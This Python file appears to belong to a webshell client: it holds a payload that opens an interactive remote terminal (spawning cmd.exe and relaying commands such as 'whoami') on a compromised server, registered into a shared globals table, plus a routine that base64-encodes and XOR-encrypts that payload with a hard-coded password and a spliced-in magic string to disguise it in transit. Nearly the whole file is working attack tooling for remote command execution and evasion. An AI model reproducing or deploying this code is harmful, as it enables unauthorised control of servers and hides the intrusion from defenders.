# -*- coding: utf-8 -*-
"""
@Time ： 2024-06-13 13:02
@Auth ： No2Cat
@File ：payload_encrypt.py
@IDE ：PyCharm
@DESC：
"""
from Common.RandXor import RandXor
import base64
import random

Payload1 = """
import threading, queue, subprocess, locale, time
default_coding = locale.getdefaultlocale()
cmd_content = dict()
def X_read_output(terminal, outq):
    while cmd_content.get('run'):
        try:
            line = terminal.stdout.readline()
            if line:
                outq.put(line.decode(locale.getpreferredencoding(), errors='replace'))
        except:
            pass

def X_read_error(terminal, outq):
    while cmd_content.get('run'):
        try:
            errput = terminal.stderr.readline()
            if errput:
                outq.put(errput.decode(locale.getpreferredencoding(), errors='replace'))
        except:
            pass

def X_output_reader(terminal, outq):
    idle = 0
    while cmd_content.get('run') and idle < 100000:
        write = cmd_content.get('writeBuffer') if 'writeBuffer' in cmd_content else ''
        # if 'writeBuffer' in session:
        #     print('session', session)
        if len(write) > 0:
            print('命令输入', write)
            terminal.stdin.write(write.encode(default_coding[-1]))
            terminal.stdin.flush()
            cmd_content['writeBuffer'] = ''
            idle = 0
        else:
            idle += 1

        try:
            while not outq.empty():
                cmd_content['readBuffer'] += outq.get(block=False)
        except queue.Empty:
            pass
        # print(idle)
        time.sleep(0.8)
    terminal.terminate()
    print('stop')

def create_terminal(binPath):
    cmd_content['readBuffer'] = ''
    outq = queue.Queue()
    terminal = subprocess.Popen(binPath.split(' '), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    cmd_content['run'] = True
    cmd_content['taks_id'] = terminal.pid

    # 启动单独的线程来读取 stdout 和 stderr
    threading.Thread(target=X_read_output, args=(terminal, outq)).start()
    threading.Thread(target=X_read_error, args=(terminal, outq)).start()
    threading.Thread(target=X_output_reader, args=(terminal, outq)).start()


def X_main(data):
    # data = request.json
    # data = gl['request'].json
    type = data.get('type')
    binPath = data.get('binPath', "")
    cmd = data.get('cmd', "")
    result = dict()
    if type == 'create':
        create_terminal(binPath)
        result["status"] = "success"
        result["msg"] = "ok"
        result['taks_id']  = cmd_content['taks_id']
    elif type == 'read':
        if 'readBuffer' in cmd_content:
            readContent = cmd_content.get('readBuffer')
            cmd_content['readBuffer'] = ''
            result["status"] = "success"
            result["msg"] = readContent
        else:
            result["status"] = "fail"
            result["msg"] = "Virtual Terminal fail to start or timeout"
    elif type == 'write':
        cmd_content['writeBuffer'] = cmd + '\\n'
        result["status"] = "success"
        result["msg"] = "ok"
    elif type == 'stop':
        cmd_content['run'] = False
        result["status"] = "stopped"
        result["msg"] = "ok"
    return result
gl['X_main'] = X_main
"""

Payload = """
resp = gl['X_main']({'type': 'stop', 'binPath': 'cmd.exe', "cmd": "whoami"})
"""


def main(payload, m):
    password = 'pass'
    rx = RandXor(password)
    PayloadB64 = base64.b64encode(payload.encode('utf-8'))
    p_enc = rx.encrypt(PayloadB64)
    pm_enc = p_enc[0:m] + rx.magic_str + p_enc[m:]
    return p_enc, pm_enc

if __name__ == '__main__':
    PayloadX = str(Payload)
    m = random.randint(0, len(PayloadX))
    p_enc, pm_enc = main(PayloadX, m)
    print(m)
    print(p_enc)
    print(pm_enc)